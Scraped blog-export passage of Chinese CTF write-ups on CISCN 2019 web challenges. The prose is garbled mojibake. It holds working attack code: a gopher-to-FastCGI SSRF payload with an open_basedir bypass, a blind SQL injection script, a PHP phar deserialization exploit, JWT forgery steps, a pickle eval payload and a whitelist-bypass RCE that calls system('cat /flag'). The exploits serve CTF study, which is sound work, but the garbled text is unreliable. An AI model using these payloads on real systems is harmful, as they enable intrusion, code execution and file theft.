$url=\"gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00\";&#125;@unlink('phar.phar');$p = new Phar('phar.phar');$p-&gt;startBuffering();$p-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$o=new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString('test.txt','test');$p-&gt;stopBuffering(); è¿™é‡Œè‡ªå·±å¼€å§‹çŠ¯äº†ä¸ªå¤§é”™ï¼Œæ²¡æœ‰ç»™å…¶å¸¦ä¸Š9000ç«¯å£.å¦åˆ™æˆ‘ä»¬çš„gopheræ•°æ®æ˜¯å‘ç»™80ç«¯å£çš„ã€‚è€Œå®é™…ä¸Šï¼Œæˆ‘ä»¬è¦æ‰“çš„æ˜¯ç›‘å¬9000ç«¯å£çš„FPMã€‚æ‰€ä»¥æ³¨æ„paylaodæ ¼å¼çš„ç«¯å£ä¸ä¸‹åˆ’çº¿ã€‚ä¹‹åçœ‹åˆ°phpinfo()ä¼šå‘ç°åˆç¦æ‰äº†ç³»ç»Ÿå‡½æ•°ã€‚ä½†æ˜¯ä¸»è¦çš„è¦ç‚¹åœ¨äºbypass open_basedirã€‚å¦åˆ™æˆ‘ä»¬çš„è¡ŒåŠ¨ä¼šè¢«é™åˆ¶åœ¨è¿™å±‚ç›®å½•ã€‚è€ƒè™‘ç›®å½•é€»è¾‘ 12&#x2F;flag&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php ç›´æ¥æ„é€ payloadï¼š 1mkdir('byc');chdir('byc');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag')); åˆ°æ ¹ç›®å½•å°±å¯ä»¥æ‹¿flagäº†ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"CISCN-2019-webéƒ¨åˆ†å¤ç°","slug":"CISCN-2019-webéƒ¨åˆ†å¤ç°","date":"2020-02-19T13:30:02.000Z","updated":"2021-02-18T05:08:53.088Z","comments":true,"path":"2020/02/19/CISCN-2019-webéƒ¨åˆ†å¤ç°/","link":"","permalink":"https://www.bycsec.top/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/","excerpt":"åŸæ¥å›½èµ›å°±æ˜¯CISCNâ€¦â€¦buuojä¸Šé¢˜ç›®æŒºå…¨çš„ï¼Œå¹²è„†é€‰ä¸€äº›æ¯”è¾ƒæœ‰ä»·å€¼çš„é¢˜ç›®å¤ç°ä¸‹ï¼š Hack World(ç›²æ³¨)ç®€å•çš„å¸ƒå°”ç›²æ³¨é¢˜ï¼Œç®€å•FUZZä¸€ä¸‹å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚åŒæ—¶è¿‡æ»¤äº†andï¼Œorï¼Œunionç©ºæ ¼ç­‰ç­‰ã€‚å›æ˜¾å¯ä»¥åˆ¤æ–­æ­£è¯¯ï¼Œè€ƒè™‘æ˜¯å¸ƒå°”ç›²æ³¨ã€‚payloadç›´æ¥ç”¨ifåˆ†æµå³å¯ã€‚ç©ºæ ¼å¯ä»¥%0aç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹¬å·æ‹¬èµ·æ¥(ä¹‹å‰æ€»ç»“è¿‡)","text":"åŸæ¥å›½èµ›å°±æ˜¯CISCNâ€¦â€¦buuojä¸Šé¢˜ç›®æŒºå…¨çš„ï¼Œå¹²è„†é€‰ä¸€äº›æ¯”è¾ƒæœ‰ä»·å€¼çš„é¢˜ç›®å¤ç°ä¸‹ï¼š Hack World(ç›²æ³¨)ç®€å•çš„å¸ƒå°”ç›²æ³¨é¢˜ï¼Œç®€å•FUZZä¸€ä¸‹å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚åŒæ—¶è¿‡æ»¤äº†andï¼Œorï¼Œunionç©ºæ ¼ç­‰ç­‰ã€‚å›æ˜¾å¯ä»¥åˆ¤æ–­æ­£è¯¯ï¼Œè€ƒè™‘æ˜¯å¸ƒå°”ç›²æ³¨ã€‚payloadç›´æ¥ç”¨ifåˆ†æµå³å¯ã€‚ç©ºæ ¼å¯ä»¥%0aç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹¬å·æ‹¬èµ·æ¥(ä¹‹å‰æ€»ç»“è¿‡) expï¼š 123456789101112131415161718192021import requests#flag&#123;3de016a6-fb79-4b56-a2fb-ea24bc26083f&#125;url='http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php'flag=''for i in range(1,50): print(i) a=0 for j in range(32,128): payload=\"if(ascii(substr((select%0aflag%0afrom%0aflag),\"+str(i)+\",1))=\"+str(j)+\",1,2)\" data = &#123; 'id': payload &#125; res=requests.post(url,data=data) if 'Hello' in res.text: flag+=chr(j) print(flag) a=1 break if a==0: break Dropbox(pharååºåˆ—åŒ–)é¢˜ç›®å±äºphpååºåˆ—åŒ–ã€‚æ„Ÿè§‰å›½èµ›çš„é¢˜ç›®ç¡®å®è´¨é‡å¾ˆé«˜ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨çœ‹äº†æºç ä¸å°‘æ—¶é—´æ‰æ‰¾å‡ºåˆ©ç”¨ã€‚èµ¶ç´§è®°å½•ä¸‹ã€‚é¦–å…ˆè¿›æ¥æ³¨å†Œè´¦å·ç™»é™†ã€‚å‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚é¡ºæ‰‹ä¼ ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åæä¾›äº†å¯¹å›¾ç‰‡çš„ä¸‹è½½ä¸åˆ é™¤åŠŸèƒ½ã€‚æ­¤æ—¶ä¾æ¬¡å°è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¸‹è½½åŠŸèƒ½çš„filenameå…è®¸ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œäºæ˜¯ç›´æ¥æ‹¿åˆ°index.phpçš„æºç ï¼Œæ¥ç€å¯ä»¥æ‹¿åˆ°å…¶ä»–å…³é”®æºç ï¼Œå‘ç°æ˜¯phpååºåˆ—åŒ–ï¼Œå¼€å§‹å®¡è®¡ã€‚index.php 123456789101112131415&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;?&gt;&lt;?php echo $_SESSION['username']?&gt;&lt;?phpinclude \"class.php\";$a = new FileList($_SESSION['sandbox']);$a-&gt;Name();$a-&gt;Size();?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) &#123; $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; &#125; $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) &#123; $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; &#125; $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;Ã¤Â¸Â‹Ã¨Â½Â½&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;Ã¥Âˆ Ã©Â™Â¤&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; download.php 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include \"class.php\";ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, \"flag\") === false) &#123; Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo \"File not exist\";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response);&#125; else &#123; Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response);&#125;?&gt; å®¡è®¡æºç ç¬¬ä¸€ååº”é¦–å…ˆæ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯éšå³å‘ç°ä¸å­˜åœ¨å¯æ§å‚æ•°ï¼Œæ‰€ä»¥æ³¨å…¥æ— æœã€‚æ¥ä¸‹æ¥é‡å¿ƒæ”¾åœ¨ååºåˆ—åŒ–ä¸Šã€‚é¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œæˆ‘ä»¬æºç ä¸­å¹¶ä¸å­˜åœ¨unserialize()å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚æ‰€ä»¥ååºåˆ—åŒ–éœ€è¦é€šè¿‡ä¸Šä¼ pharæ–‡ä»¶å¹¶è¿›è¡Œphar://ä¼ªåè®®è§¦å‘ã€‚ æ¥ä¸‹æ¥å¯»æ‰¾å¸¸è§æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œæ³¨æ„åˆ°Fileç±»file_get_contents()æ–¹æ³• 123public function close() &#123; return file_get_contents($this-&gt;filename);&#125; ç¡®å®šæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–äº†ã€‚æ¥ä¸‹æ¥æŒ–æ˜ä¸€ä¸‹å‡½æ•°çš„è°ƒç”¨ã€‚é¦–å…ˆclose()æ˜¯Fileç±»çš„æ–¹æ³•ï¼Œè€ŒFileç±»åªåœ¨Filelistç±»ä¸­æœ‰è°ƒç”¨è¿‡ã€‚ä½†Filelistä¸­å¹¶æ²¡æœ‰è°ƒç”¨close()æ–¹æ³•çš„ä½ç½®ã€‚æ­¤æ—¶éœ€è¦æ³¨æ„Filelistç±»ä¸­çš„ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¹‹ä¸€ï¼š 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; å®ƒå°†Filelistç±»ä¸­çš„filesæ•°ç»„å…¨éƒ¨éå†äº†ä¸€éï¼Œå¹¶æ‰§è¡Œå¯¹åº”çš„func()ç»“æœè¢«å­˜è¿›resultã€‚ä¹‹åçš„__destruct()æ–¹æ³•åˆ™ä¼šå°†resultç­‰ç­‰ç»“æœæ‰“å°å‡ºæ¥ã€‚è¿™ä¸€æ¡åˆ©ç”¨åœ¨äºï¼šç¡®ä¿äº†Filelistçš„å¯¹è±¡å¦‚æœèƒ½å€Ÿæ­¤é­”æœ¯æ–¹æ³•è°ƒç”¨close()æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒæœ€åé”€æ¯æ—¶ææ„å‡½æ•°ä¼šæ‰“å°å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶å†…å®¹ã€‚ä¹‹åå†æ¬¡å®¡è®¡ï¼Œæ³¨æ„åˆ°Userç±»çš„__destruct()æ–¹æ³• 123public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; åŸæœ¬åªæ˜¯ä¸€ä¸ªåŒåclose()å‡½æ•°ï¼Œä½†æ˜¯æ­¤å¤„å´å­˜åœ¨ç€å¯åˆ©ç”¨ä¹‹å¤„ã€‚å‡å¦‚æˆ‘ä»¬çš„æ–‡ä»¶ä¸Šä¼ çš„æ˜¯Userç±»çš„å¯¹è±¡ã€‚é”€æ¯æ—¶è‡ªç„¶ä¼šæ‰§è¡Œclose()å‡½æ•°ã€‚ä½†å¦‚æœæŠŠdbè®¾ç½®ä¸ºFilelistç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆdb-&gt;close()æ‰§è¡Œæ—¶å°†æ‰¾ä¸åˆ°close()å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œå…¶filesæ•°ç»„é‡Œçš„æ¯ä¸€ä¸ªå‡½æ•°ã€‚é‚£ä¹ˆå¦‚æœfilesæ•°ç»„é‡Œæ˜¯å­˜åœ¨åŒåå‡½æ•°closeçš„Fileç±»å¯¹è±¡ï¼Œå°±èƒ½æˆåŠŸæ‰§è¡Œæ–‡ä»¶è¯»å–ã€‚æ‰¾åˆ°åˆ©ç”¨é“¾åï¼Œexpå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;@unlink(\"phar.phar\");$phar = new Phar(\"a.phar\"); $phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); $o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering(); ç”Ÿæˆçš„a.pharä¿®æ”¹åç¼€ä¸Šä¼ ï¼Œä¹‹åéœ€è¦æ‰¾è§¦å‘æ–¹å¼ï¼Œæ­¤å¤„éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨download.phpä¸­ï¼Œè®¾ç½®äº†ç›®å½•ï¼š 1ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); è€Œåªæœ‰delete.phpä¸­çš„ç›®å½•æ˜¯åœ¨é¢˜ç›®ç»™å®šçš„æ–‡ä»¶ä¸Šä¼ æ²™ç›’ä¸­çš„ï¼š 1chdir($_SESSION['sandbox']); æ•…åªæœ‰deleteæ“ä½œèƒ½ç›´æ¥phar://è§¦å‘ååºåˆ—åŒ–ã€‚ (è¿™é‡Œçš„æ–‡ä»¶è¯»å–flag.txtæ˜¯ä¼ ç»Ÿè‰ºèƒ½ï¼Ÿæ¯æ¬¡é¢˜ç›®éƒ½æ²¡äº¤ä»£ï¼‰ ikun(pythonååºåˆ—åŒ–)ç»“åˆäº†å¾ˆå¤šçŸ¥è¯†ç‚¹çš„ä¸€é“é¢˜ç›®ï¼Œä½†æ˜¯æœ€åä¸€æ­¥çš„pythonååºåˆ—åŒ–ç¡®å®ä¸ä¼šï¼Œåªå¥½å»æ‰¾äº†æ‰¾wpã€‚(æœ¬æ¥ä¹‹å‰æ‰“ç®—å­¦ä¸‹pythonååºåˆ—åŒ–çš„ï¼Œç»“æœæå¿˜äº†hhh) é¦–å…ˆç™»é™†é¢˜ç›®å‘ç°åœ¨è¿«å®³cxkï¼ŒåŒæ—¶åº•ä¸‹æœ‰è®¸å¤šå•†å“æç¤ºéœ€è¦è´­ä¹°lv6çš„å•†å“ã€‚ä½†æ˜¯çœ‹äº†åŠå¤©å‰å‡ é¡µå¹¶æ²¡æ‰¾åˆ°lv6å•†å“ï¼Œç”±äºé¡µæ•°pageç›´æ¥getä¼ å€¼ï¼Œçœ‹æ¥éœ€è¦è„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š 12345678import requestsurl='http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page='for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break ä¹‹åå‘ç°lv6å•†å“ï¼ŒåŠ å…¥åˆ°è´­ç‰©è½¦åï¼Œå‡†å¤‡æ³¨å†Œè´¦å·å¹¶ç™»å½•è´­ä¹°ã€‚æ˜¾ç„¶é’±æ•°æ˜¯ä¸å¤Ÿçš„ï¼Œä½†æ˜¯å´æœ‰æŠ˜æ‰£è¿™ä¸€å‚æ•°è¢«ç›´æ¥postä¼ å€¼ã€‚é‚£ä¹ˆä¿®æ”¹å…¶å€¼è¶³å¤Ÿå°å³å¯ã€‚å¾—åˆ°ä¸€ä¸ªç›®å½•b1g_m4mberã€‚åº”è¯¥æ˜¯åå°åœ°å€ã€‚è®¿é—®ç½‘å€æç¤ºéœ€è¦adminæ“ä½œæƒé™ã€‚è¿™é‡ŒæŠ“åŒ…ä¸€ä¸‹ï¼Œå‘ç°cookieé‡Œå±…ç„¶æœ‰JWTã€‚çœ‹æ¥æ˜¯æ¯”è¾ƒå¸¸è§çš„JWTä¼ªé€ è®¤è¯äº†ã€‚(ä¹‹å‰åœ¨hacktheboxæŸä¸€å°é¶æœºä¸­å°±å­˜åœ¨ä»¿é€ JWTç™»å½•çš„æ“ä½œï¼Œåº”è¯¥è¯´å¹¶ä¸éš¾ï¼Œè€Œä¸”æ¯”è¾ƒå¥½ç†è§£)å…ˆæ‹¿æ¥base64è§£ç ï¼Œå‘ç°å­˜åœ¨ä¹±ç ã€‚å¯èƒ½æ˜¯å› ä¸ºåŠ äº†ç›å€¼keyçš„åŸå› ã€‚é‚£ä¹ˆç¬¬ä¸€æ­¥å…ˆçˆ†ç ´ä¸‹keyå€¼ï¼šhttps://github.com/brendan-rius/c-jwt-crackerå¾—åˆ°JWTKey ä¸º1Kun,æ¥ä¸‹æ¥ä¸Šhttps://jwt.io/å»ç”Ÿæˆadminçš„jwt token.å¯ä»¥çœ‹åˆ°jwt-tokenä¸€å®šæ˜¯xxx.yyy.zzzçš„å½¢å¼ã€‚ä¸”ä¸‰æ®µå„è‡ªä»£è¡¨header,paylaodï¼Œsignatureçš„jsonæ•°æ®å†…å®¹ç»base64å¤„ç†ã€‚çˆ†ç ´keyå€¼ä¿®æ”¹paylloadä¸ºadminä¹Ÿæ˜¯å®¶å¸¸ä¾¿é¥­ã€‚æ§åˆ¶å°é‡Œä¿®æ”¹ 1document.cookie&#x3D;&quot;JWT&#x3D;xxxxxxxxxxx&quot; æˆåŠŸç™»é™†ã€‚ ä¹‹åå‘ç°æºç å­˜åœ¨www.zipã€‚å¯ä»¥æ‹¿åˆ°æºç ã€‚ç„¶åæˆ‘å°±ä¸ä¼šäº†â€¦â€¦.æŸ¥wpåå‘ç°æ˜¯pythonååºåˆ—åŒ–ã€‚å…·ä½“æ¼æ´åœ¨Admin.pyï¼š 12345678910111213141516171819202122import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) becomeå¯æ§ã€‚è¿™é‡Œå…¶å®å¯ä»¥æŠŠpickle.loadsçš„æ“ä½œç†è§£ä¸ºååºåˆ—åŒ–ã€‚è€Œ__reduce__è¿™ä¸€é­”æœ¯æ–¹æ³•ä¼šåœ¨å¯¹è±¡è¢«pickleæ—¶è°ƒç”¨ã€‚ä»è€Œå¯ä»¥æ„é€ payload: 123456789import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a= urllib.quote(a)print(a) è¿™é‡Œæˆ‘çš„expåœ¨æœ¬æœºè·‘å‡ºæ¥ç»“æœä¸çŸ¥ä¸ºä½•æ˜¯é”™çš„ã€‚åªæœ‰ç”¨kaliæ‰è·‘å‡ºæ­£ç¡®çš„ç»“æœä¼ å€¼æ‹¿flag Love Math(æ„é€ RCE)æºç ï¼š 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"å¤ªé•¿äº†ä¸ä¼šç®—\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\"); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\"); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval('echo '.$content.';');&#125; é¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè¾¾æˆç›®çš„æ˜¾ç„¶æ˜¯RCEã€‚ä½†æ˜¯å¯ä»¥å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä¸å‡½æ•°ï¼Œé™åˆ¶äº†é•¿åº¦ã€‚è€Œç™½åå•å†…çš„å‡½æ•°å…¨éƒ¨æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•çš„å­—ç¬¦è¿‡æ»¤äº†å¸¸è§æ ‡ç‚¹ã€‚ç°åœ¨è¦è¾¾æˆRCEéœ€è¦ç»•è¿‡ä¸Šçš„å¥‡æ·«æŠ€å·§ã€‚ é¦–å…ˆæœ‰ä¸€ç§æ€è·¯æ˜¯åˆ†å¼€ä¼ å€¼ ï¼Œæˆ‘ä¸ªäººä¹Ÿæ¯”è¾ƒåå¥½è¿™ç§åšæ³•ã€‚å…·ä½“å½¢å¼å¤§è‡´æ˜¯ 1?c&#x3D;$_GET[a]&amp;a&#x3D;system(&#39;ls&#39;); ä½†æ˜¯æ­¤é¢˜é¦–å…ˆå˜é‡åä¸èƒ½éšæ„ï¼Œåªèƒ½ä»ç™½åå•ä¸­æ‰¾å‡ºå¯ç”¨æ•°å­¦ç¬¦å·ä½œä¸ºå˜é‡åã€‚æ­¤å¤„è€ƒè™‘é•¿åº¦ä½¿ç”¨piã€‚ç„¶åæ˜¯è€ƒè™‘ï¼Œåœ¨_GET[]è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹èƒ½ä½¿ç”¨ä»€ä¹ˆæ•°å­¦å‡½æ•°è¾¾æˆæ„é€ å­—ç¬¦ä¸²çš„ç›®çš„ã€‚è¿™é‡Œåº”è¯¥é¦–å…ˆè€ƒè™‘è¿›åˆ¶è½¬æ¢å‡½æ•°ï¼Œå› ä¸º10è¿›åˆ¶ä»¥ä¸Šçš„æ•°éƒ½æœ‰è‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ã€‚è€Œå‡å¦‚æ˜¯36è¿›åˆ¶æ•°çš„è¯ï¼Œå°†ä¼šæ‹¥æœ‰1~10åŠ ä¸Š26ä¸ªè‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ï¼Œè¿™è¶³ä»¥æˆ‘ä»¬æ‹¼å‡‘å‡ºpayloadã€‚å‡å¦‚payloadæ˜¯ï¼š 1?c&#x3D;($_GET)&#123;0&#125;($_GET)&#123;1&#125;;&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag é‚£ä¹ˆæˆ‘ä»¬åªéœ€æ„é€ å‡º_GETå­—ç¬¦ä¸²ã€‚å…·ä½“å€’æ¨æ–¹æ³•å¦‚ä¸‹ï¼š 1234_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#çº¯æ•°å­—#éœ€è¦æ„é€ hex2bin()base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743 æ‰€ä»¥ 